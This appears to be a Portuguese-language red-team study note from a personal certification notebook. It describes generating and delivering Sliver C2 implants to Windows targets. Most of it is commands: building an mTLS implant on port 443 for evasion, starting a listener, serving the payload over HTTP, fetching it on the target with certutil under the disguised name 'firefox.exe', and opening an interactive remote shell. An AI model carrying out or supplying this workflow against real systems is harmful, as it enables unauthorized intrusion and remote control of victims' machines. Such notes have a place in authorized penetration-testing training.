> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/listener-and-implant-creation/generating-and-delivering-implants-on-windows-targets.md).

# Generating and delivering implants on Windows targets

Objetivo

Gerar um implant para **Windows**, configurar listener e obter **shell interativo completo** via Sliver C2.

**Gerar o implant Windows**

No Sliver:

```
generate --mtls <SEU_IP>:443 --os windows --arch amd64 --save /home/kali
```

Observações:

* Gera um `.exe`
* Usa MTLS (criptografado)
* Porta 443 ajuda na evasão

**Configurar o listener**

```
mtls --lhost 0.0.0.0 --lport 443
```

Deve ser igual ao configurado no implant

**Transferir o implant**

Opções:

* SCP / SMB
* HTTP server:

```
python3 -m http.server 80
```

* Download via navegador no alvo
* Download via certutil no alvo

```
certutil.exe -urlcache -split -f http://<IP>:80/firefox.exe firefox.exe
```

**Executar no Windows alvo**

* Clique no `.exe` **ou**
* Via CMD/PowerShell:

```
.\implant.exe
```

**Verificar conexão**

No Sliver:

```
sessions
```

&#x20;Deve aparecer uma nova sessão ativa

**Interagir com a sessão**

```
use <session_id>
```

**Obter shell interativo completo**

Dentro da sessão:

```
shell
```

Diferença importante:

* `use` → controle da sessão Sliver
* `shell` → shell real do Windows (CMD)

**Fluxo completo**

1. Gerar implant (.exe)
2. Iniciar listener
3. Transferir payload
4. Executar no alvo
5. Receber sessão
6. Abrir shell interativo
